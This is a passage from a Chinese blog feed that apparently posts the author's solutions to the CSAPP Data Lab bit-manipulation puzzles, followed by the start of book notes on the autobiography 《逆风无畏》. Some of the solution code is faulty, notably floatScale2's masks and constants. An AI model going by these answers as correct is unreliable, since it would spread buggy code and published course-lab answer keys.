class="keyword">int</span> <span class="title">allOddBits</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="comment">//return !(~(x|(x&gt;&gt;1)));</span></span><br><span class="line">  <span class="keyword">return</span> !(~(x|(<span class="number">0x55</span>+(<span class="number">0x55</span>&lt;&lt;<span class="number">8</span>)+(<span class="number">0x55</span>&lt;&lt;<span class="number">16</span>)+(<span class="number">0x55</span>&lt;&lt;<span class="number">24</span>))));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>对一个数取负值，取反加1,常规操作即可。<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * negate - return -x </span></span><br><span class="line"><span class="comment"> *   Example: negate(1) = -1.</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 5</span></span><br><span class="line"><span class="comment"> *   Rating: 2</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">negate</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (~x) + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>这个就比较复杂了，我们还是利用减法的原理，然后取出符号位即可。<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//3</span></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * isAsciiDigit - return 1 if 0x30 &lt;= x &lt;= 0x39 (ASCII codes for characters '0' to '9')</span></span><br><span class="line"><span class="comment"> *   Example: isAsciiDigit(0x35) = 1.</span></span><br><span class="line"><span class="comment"> *            isAsciiDigit(0x3a) = 0.</span></span><br><span class="line"><span class="comment"> *            isAsciiDigit(0x05) = 0.</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 15</span></span><br><span class="line"><span class="comment"> *   Rating: 3</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">isAsciiDigit</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">   <span class="keyword">return</span> !((x+~<span class="number">48</span>+<span class="number">1</span>)&gt;&gt;<span class="number">31</span>)&amp;!!((x+~<span class="number">58</span>+<span class="number">1</span>)&gt;&gt;<span class="number">31</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>这个就比较简单了，如果x不为<code>0</code>我们返回<code>y</code>；<code>x</code>为<code>0</code>则返回<code>z</code>。题目还是比较麻烦的。我们直接测试<code>x</code>是否为<code>0</code>,如果<code>x</code>为<code>0</code>，我们则将其取反加1，则他变为<code>0XFFFFFFFF</code>的掩码。<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * conditional - same as x ? y : z </span></span><br><span class="line"><span class="comment"> *   Example: conditional(2,4,5) = 4</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 16</span></span><br><span class="line"><span class="comment"> *   Rating: 3</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">conditional</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y, <span class="keyword">int</span> z)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> ((!x + ~<span class="number">1</span> + <span class="number">1</span>)&amp;y)|((~(!x) + <span class="number">1</span>)&amp;z);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>这个就比较难了点，因为有溢出的问题，如果不存在溢出的话，我们直接计算$x-y$的符号位即可得到结果，但是存在溢出的问题需要我们单独处理，我们仔细分析一下，实际上只有$x$与$y$的符号位异位时，减法才可能出现溢出，但是实际上如果出现符号位不同的话，我们不用减法即可知道大小问题，所以我们只需要判断<code>x</code>与<code>y</code>的符号位是否相同，如果符号位相同则我们用减法即可；否则我们直接取符号位即可判断大小。<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * isLessOrEqual - if x &lt;= y  then return 1, else return 0 </span></span><br><span class="line"><span class="comment"> *   Example: isLessOrEqual(4,5) = 1.</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 24</span></span><br><span class="line"><span class="comment"> *   Rating: 3</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">isLessOrEqual</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> opx = x&gt;&gt;<span class="number">31</span>;</span><br><span class="line">  <span class="keyword">int</span> opy = y&gt;&gt;<span class="number">31</span>;</span><br><span class="line">  <span class="keyword">int</span> op = opx^opy;</span><br><span class="line">  <span class="keyword">int</span> opxy = (y + (~x) + <span class="number">1</span>)&gt;&gt;<span class="number">31</span>;</span><br><span class="line">  <span class="keyword">return</span> (op&amp;opx&amp;(!opy))|((!op)&amp;(!opxy));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>这个逻辑取反，如果<code>x</code>为<code>0</code>，则返回<code>1</code>，否则返回<code>0</code>.我们实际上可以将所有的位依次进行或即可得到最终结果。当然另一种解法就是取符号位即判断<code>(-x)</code>与<code>(~x)</code>的符号位的问题。<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//4</span></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * logicalNeg - implement the ! operator, using all of </span></span><br><span class="line"><span class="comment"> *              the legal operators except !</span></span><br><span class="line"><span class="comment"> *   Examples: logicalNeg(3) = 0, logicalNeg(0) = 1</span></span><br><span class="line"><span class="comment"> *   Legal ops: ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 12</span></span><br><span class="line"><span class="comment"> *   Rating: 4 </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">logicalNeg</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">  x = (x&gt;&gt;<span class="number">16</span>)|x;</span><br><span class="line">  x = (x&gt;&gt;<span class="number">8</span>)|x;</span><br><span class="line">  x = (x&gt;&gt;<span class="number">4</span>)|x;</span><br><span class="line">  x = (x&gt;&gt;<span class="number">2</span>)|x;</span><br><span class="line">  x = (x&gt;&gt;<span class="number">1</span>)|x;</span><br><span class="line">  x = (~x)&amp;<span class="number">0x1</span>;</span><br><span class="line">  <span class="keyword">return</span> x;</span><br><span class="line">  <span class="comment">//return((~(~x+1)&amp;~x)&gt;&gt;31)&amp;1;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>这个题目时最难的，用了二分查找的方法，还是非常巧妙的方法，估计我想不出来。<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* howManyBits - return the minimum number of bits required to represent x in</span></span><br><span class="line"><span class="comment"> *             two's complement</span></span><br><span class="line"><span class="comment"> *  Examples: howManyBits(12) = 5</span></span><br><span class="line"><span class="comment"> *            howManyBits(298) = 10</span></span><br><span class="line"><span class="comment"> *            howManyBits(-5) = 4</span></span><br><span class="line"><span class="comment"> *            howManyBits(0)  = 1</span></span><br><span class="line"><span class="comment"> *            howManyBits(-1) = 1</span></span><br><span class="line"><span class="comment"> *            howManyBits(0x80000000) = 32</span></span><br><span class="line"><span class="comment"> *  Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *  Max ops: 90</span></span><br><span class="line"><span class="comment"> *  Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">int howManyBits(int x) &#123;</span></span><br><span class="line"><span class="comment">  int sign = x&gt;&gt;31;</span></span><br><span class="line"><span class="comment">  int b16,b8,b4,b2,b1,b0;</span></span><br><span class="line"><span class="comment">  x = (~sign&amp;x)|(sign&amp;());</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  b16 = !!(x&gt;&gt;16); ///we check if 23~31 bits has one</span></span><br><span class="line"><span class="comment">  x = x&gt;&gt;(b16&lt;&lt;4);</span></span><br><span class="line"><span class="comment">  b8 = !!(x&gt;&gt;8);  //we check if 23~31 bits has one</span></span><br><span class="line"><span class="comment">  x = x&gt;&gt;(b8&lt;&lt;3);</span></span><br><span class="line"><span class="comment">  b4 = !!(x&gt;&gt;4);</span></span><br><span class="line"><span class="comment">  x = x&gt;&gt;(b4&lt;&lt;2);</span></span><br><span class="line"><span class="comment">  b2 = !!(x&gt;&gt;2);</span></span><br><span class="line"><span class="comment">  x = x&gt;&gt;(b2&lt;&lt;1);</span></span><br><span class="line"><span class="comment">  b1 = !!(x&gt;&gt;1);</span></span><br><span class="line"><span class="comment">  x = x&gt;&gt;b1;</span></span><br><span class="line"><span class="comment">  b0 = x;</span></span><br><span class="line"><span class="comment">  return b16 + b8 + b4 + b2 + b1 + b0 + 1;</span></span><br><span class="line"><span class="comment">&#125;*/</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">howManyBits</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> b16,b8,b4,b2,b1,b0;</span><br><span class="line">  <span class="keyword">int</span> sign=x&gt;&gt;<span class="number">31</span>;</span><br><span class="line">  x = (sign&amp;~x)|(~sign&amp;x);<span class="comment">//如果x为正则不变，否则按位取反（这样好找最高位为1的，原来是最高位为0的，这样也将符号位去掉了）</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 不断缩小范围</span></span><br><span class="line">  b16 = !!(x&gt;&gt;<span class="number">16</span>)&lt;&lt;<span class="number">4</span>;<span class="comment">//高十六位是否有1</span></span><br><span class="line">  x = x&gt;&gt;b16;<span class="comment">//如果有（至少需要16位），则将原数右移16位</span></span><br><span class="line">  b8 = !!(x&gt;&gt;<span class="number">8</span>)&lt;&lt;<span class="number">3</span>;<span class="comment">//剩余位高8位是否有1</span></span><br><span class="line">  x = x&gt;&gt;b8;<span class="comment">//如果有（至少需要16+8=24位），则右移8位</span></span><br><span class="line">  b4 = !!(x&gt;&gt;<span class="number">4</span>)&lt;&lt;<span class="number">2</span>;<span class="comment">//同理</span></span><br><span class="line">  x = x&gt;&gt;b4;</span><br><span class="line">  b2 = !!(x&gt;&gt;<span class="number">2</span>)&lt;&lt;<span class="number">1</span>;</span><br><span class="line">  x = x&gt;&gt;b2;</span><br><span class="line">  b1 = !!(x&gt;&gt;<span class="number">1</span>);</span><br><span class="line">  x = x&gt;&gt;b1;</span><br><span class="line">  b0 = x;</span><br><span class="line">  <span class="keyword">return</span> b16+b8+b4+b2+b1+b0+<span class="number">1</span>;<span class="comment">//+1表示加上符号位</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>浮点数的运算比较复杂，还是需要稍微复习下浮点数<code>IEEE754</code>的标准。<br>浮点数分为三部分，符号位，阶码(指数位)，有效数字位。详细的IEEE754的数据格式标准可以参考如下连接：<a href="http://c.biancheng.net/view/314.html" target="_blank" rel="noopener">IEEE754</a><br><img src="https://i.loli.net/2020/11/06/u9jtFM7gm2oqRTK.png" alt="1"><br>其中：</li></ol><ul><li><code>符号位 s（Sign）</code>决定数是正数（s＝0）还是负数（s＝1），而对于数值 0 的符号位解释则作为特殊情况处理。</li><li><code>有效数字位 M（Significand）</code>是二进制小数，它的取值范围为 1~2-ε，或者为 0~1-ε。它也+ 被称为尾数位（Mantissa）、系数位（Coefficient），甚至还被称作“小数”。</li><li><code>指数位 E（Exponent）</code>是 2 的幂（可能是负数），它的作用是对浮点数加权。</li></ul><p>浮点数格式是一种数据结构，它规定了构成浮点数的各个字段、这些字段的布局及算术解释。IEEE 754 浮点数的数据位被划分为三个段，从而对以上这些值进行编码。其中，一个单独的符号位 s 直接编码符号 s；k 位的指数段 exp=ek-1…e1e0，编码指数 E；n 位的小数段 frac=fn-1…f1f0，编码有效数字 M，但是被编码的值也依赖于指数域的值是否等于 0。<br>我们常用的为单精度的浮点数，数据格式显示如下：<br><img src="https://i.loli.net/2020/11/06/lTH8QgY63IeLUW1.png" alt="2"><br>其中，几个位分布如下：<code>s、exp</code>和 <code>frac</code> 段分别为 <code>1</code>位、<code>k=8</code>位和 <code>n=23</code> 位.<br>其中阶码的总共<code>8</code>位，阶码用移码表示，所以我们可以知道阶码的表示范围为：</p><script type="math/tex; mode=display">2^{-127} -2^{127}</script><p>移127码，即E=e+127，E的8位二进制数即为移127码的编码.<br>如果知道以上的表示范围后， 后面的题目就非常简单了,本题主要是讲阶码的数位加1即可。<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//float</span></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * floatScale2 - Return bit-level equivalent of expression 2*f for</span></span><br><span class="line"><span class="comment"> *   floating point argument f.</span></span><br><span class="line"><span class="comment"> *   Both the argument and result are passed as unsigned int's, but</span></span><br><span class="line"><span class="comment"> *   they are to be interpreted as the bit-level representation of</span></span><br><span class="line"><span class="comment"> *   single-precision floating point values.</span></span><br><span class="line"><span class="comment"> *   When argument is NaN, return argument</span></span><br><span class="line"><span class="comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while</span></span><br><span class="line"><span class="comment"> *   Max ops: 30</span></span><br><span class="line"><span class="comment"> *   Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">floatScale2</span><span class="params">(<span class="keyword">unsigned</span> uf)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> sign = uf&gt;&gt;<span class="number">31</span>;</span><br><span class="line">  <span class="keyword">int</span> expr = (uf&gt;&gt;<span class="number">23</span>)&amp;<span class="number">0x255</span> - <span class="number">127</span>;</span><br><span class="line">  <span class="keyword">int</span> frac = (uf&amp;<span class="number">0x007fffff</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* postive INF or negative INF*/</span></span><br><span class="line">  <span class="keyword">if</span>(expr == <span class="number">0</span>) <span class="keyword">return</span> uf&lt;&lt;<span class="number">1</span>|sign;</span><br><span class="line">  expr++;</span><br><span class="line">  <span class="keyword">if</span>(expr &gt;= <span class="number">255</span>) <span class="keyword">return</span> <span class="number">0x7f8000</span>|(sign&lt;&lt;<span class="number">31</span>); <span class="comment">/*INF*/</span></span><br><span class="line">  <span class="keyword">return</span> (expr&lt;&lt;<span class="number">23</span>)|(uf&amp;<span class="number">0x807fffff</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><ol><li>这个题目挺难的，题目中要求将浮点数转换为整数，实际转化过程还是非常复杂的，分好几种情况风别讨论。如果为<code>0</code>，则直接返回，如果为无穷大，则根据题目要求返回<code>0x80000000u</code>.因为我们返回的结果为整数，所以我们休要判断指数的大小，如果指数大于<code>31</code>，则肯定会溢出，如果指数小于<code>0</code>,则我们应该直接返回<code>0</code>.否则我们则将实数根据指数的大小进行恢复，如果指数大于等于<code>23</code>，则我们需要将实数部分向左移动大于<code>23</code>的部分；如果指数小于<code>23</code>，则我们需要向右移动小于<code>23</code>的部分。最重要的一点，对于负数的处理，在浮点数中所有的实数都是用原码表示，而在有符号整形中，我们都是采用补码表示的，所以在这里需要进行一次替换。<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * floatFloat2Int - Return bit-level equivalent of expression (int) f</span></span><br><span class="line"><span class="comment"> *   for floating point argument f.</span></span><br><span class="line"><span class="comment"> *   Argument is passed as unsigned int, but</span></span><br><span class="line"><span class="comment"> *   it is to be interpreted as the bit-level representation of a</span></span><br><span class="line"><span class="comment"> *   single-precision floating point value.</span></span><br><span class="line"><span class="comment"> *   Anything out of range (including NaN and infinity) should return</span></span><br><span class="line"><span class="comment"> *   0x80000000u.</span></span><br><span class="line"><span class="comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while</span></span><br><span class="line"><span class="comment"> *   Max ops: 30</span></span><br><span class="line"><span class="comment"> *   Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">floatFloat2Int</span><span class="params">(<span class="keyword">unsigned</span> uf)</span> </span>&#123;</span><br><span class="line">   <span class="keyword">int</span> sign = uf&gt;&gt;<span class="number">31</span>;</span><br><span class="line">   <span class="keyword">int</span> expr = (uf&gt;&gt;<span class="number">23</span>)&amp;<span class="number">0xff</span>;</span><br><span class="line">   <span class="keyword">int</span> frac = (uf&amp;<span class="number">0x007fffff</span>);</span><br><span class="line">   <span class="keyword">int</span> pos  = <span class="number">0</span>;</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">if</span>(expr == <span class="number">0</span> &amp;&amp; frac == <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">/*ZERO*/</span></span><br><span class="line">   <span class="keyword">if</span>(expr == <span class="number">255</span>) <span class="keyword">return</span> <span class="number">0x80000000</span>u; <span class="comment">/*INF*/</span></span><br><span class="line"></span><br><span class="line">   expr -= <span class="number">127</span>;</span><br><span class="line">   <span class="keyword">if</span>(expr &gt; <span class="number">31</span>) <span class="keyword">return</span> <span class="number">0x80000000</span>u; <span class="comment">/* over flow*/</span></span><br><span class="line">   <span class="keyword">if</span>(expr &lt; <span class="number">0</span>)  <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">/*zero*/</span></span><br><span class="line">   pos = expr<span class="number">-23</span>; <span class="comment">/*real pos*/</span></span><br><span class="line">   frac = frac|(<span class="number">1</span>&lt;&lt;<span class="number">23</span>); <span class="comment">/*real frac*/</span></span><br><span class="line">   <span class="keyword">if</span>(sign == <span class="number">0</span>)&#123;</span><br><span class="line">      <span class="keyword">if</span>(pos &gt;= <span class="number">0</span>) <span class="keyword">return</span> (frac&lt;&lt;pos);</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">return</span> (frac&gt;&gt;(-pos));</span><br><span class="line">   &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="keyword">if</span>(pos &gt;= <span class="number">0</span>) <span class="keyword">return</span> (~(frac&lt;&lt;pos)+<span class="number">1</span>)|(<span class="number">1</span>&lt;&lt;<span class="number">31</span>);</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">return</span> (~(frac&gt;&gt;(-pos))+<span class="number">1</span>)|(<span class="number">1</span>&lt;&lt;<span class="number">31</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>我们判断<code>pow2</code>时，如果指数部分小于等于<code>-127</code>则应该为负无穷小，此时我们直接返回<code>0</code>即可。如果指数部分为255,则此时浮点数中表示为正无穷大，此时我们返回无穷大即可。其余的部分我们直接将指数部分填充即可。<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * floatPower2 - Return bit-level equivalent of the expression 2.0^x</span></span><br><span class="line"><span class="comment"> *   (2.0 raised to the power x) for any 32-bit integer x.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *   The unsigned value that is returned should have the identical bit</span></span><br><span class="line"><span class="comment"> *   representation as the single-precision floating-point number 2.0^x.</span></span><br><span class="line"><span class="comment"> *   If the result is too small to be represented as a denorm, return</span></span><br><span class="line"><span class="comment"> *   0. If too large, return +INF.</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. Also if, while </span></span><br><span class="line"><span class="comment"> *   Max ops: 30 </span></span><br><span class="line"><span class="comment"> *   Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">floatPower2</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> INF = <span class="number">0Xff</span>&lt;&lt;<span class="number">23</span>;</span><br><span class="line">    <span class="keyword">int</span> expr = x + <span class="number">127</span>;</span><br><span class="line">    <span class="keyword">if</span>(expr &lt;= <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(expr &gt; <span class="number">255</span>) <span class="keyword">return</span> INF;</span><br><span class="line">    <span class="keyword">return</span> expr&lt;&lt;<span class="number">23</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;CSAPP-lab1-datalab&quot;&gt;&lt;a href=&quot;#CSAPP-lab1-datalab&quot; class=&quot;headerlink&quot; title=&quot;CSAPP lab1 datalab&quot;&gt;&lt;/a&gt;CSAPP lab1 datalab&lt;/h1&gt;&lt;p&gt;从上周开始做&lt;code&gt;csapp&lt;/code&gt;的&lt;code&gt;data lab&lt;/code&gt;相关project，&lt;code&gt;csapp&lt;/code&gt;的&lt;code&gt;project&lt;/code&gt;非常难的，还是非常有意思的题目。感觉&lt;code&gt;lab1&lt;/code&gt;中每个题目都像是智力题，感觉还是太难了，过于刁钻的题目，但是对这些题目摸透了，将会对数位的操作非常熟悉。题目中不光限制使用的操作符，并且限制了使用操作符的此时，所以还是非常考验智商的题目,题目做的很痛苦。&lt;/p&gt;
    
    </summary>
    
    
      <category term="代码" scheme="http://yoursite.com/categories/%E4%BB%A3%E7%A0%81/"/>
    
    
      <category term="代码实现" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%9E%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>【读书笔记】 逆风无畏</title>
    <link href="http://yoursite.com/2020/11/04/220/"/>
    <id>http://yoursite.com/2020/11/04/220/</id>
    <published>2020-11-04T06:03:43.678Z</published>
    <updated>2020-11-04T06:03:48.177Z</updated>
    
    <content type="html"><![CDATA[<h1 id="逆风无畏"><a href="#逆风无畏" class="headerlink" title="逆风无畏"></a>逆风无畏</h1><p>不知不觉花了大概两个星期把《逆风无畏》这本书看完了，本书主要讲述的是福茂集团董事长赵锡成博士的自传。为什么突然想到这本自传了，因为美国政坛最耀眼的华裔莫过于赵小兰女士了，赵博士即为赵小兰的父亲，其实当初买这本书也想探究一下，为什么这个普通的华裔家庭能够培养出来这么多优秀的后代，赵锡成的几个女儿也都非常的出色，可以算是美国顶尖的精英阶层了，我想能够透过赵博士的自传对他的人生观，价值观，教育理想可以了解和学习一下，能够对自身有所收获和学习，不光是做人的道理，更是教育后代的理念和方法。<br>当然总的来说赵锡成博士作为经历过民国时期传统文化教育的人士，他的许多人生理念和教育观念都非常偏向于东方传统的教育观念和道德观念，特别是提到的他对于商业管理的看法，对于公司管理的看法，重于人性而轻于理性，应用传统的管理理念在现代企业治理中也取得了成功。他的传统的教育理念，比如严谨严苛的教育观念，而不是典型的西方那种自由散漫式的教育，他的几个子女也都取得了非常不俗的成就，这些都是值得我们吸收和学习的。</p><a id="more"></a><p>当属反思自己在工作和生活中有哪些方面的不足，特别是在对待家庭教育方面，自己还有许多需要去争取和努力的。</p><h2 id="幼年时期"><a href="#幼年时期" class="headerlink" title="幼年时期"></a>幼年时期</h2><p>赵锡成的家世不错，江浙一带还是出人才。祖辈是当地的大地主，父辈是读书人，非常有学问，在当地有一定的名望。正是因为这样不错的家庭基础才能够对他幼年的成长提供了良好的教育基础。书中描写他的童年还是比较快乐的，父亲作为当地的小学校长，为他提供很好的入门教育。从小就非常具有学习天赋和运动天赋，使得他在接受初级教育阶段如鱼得水，远比当时国内的穷苦老百姓还是要好很多。书中描写的他度过了快乐的童年时期。</p><h2 id="少年时期"><a href="#少年时期" class="headerlink" 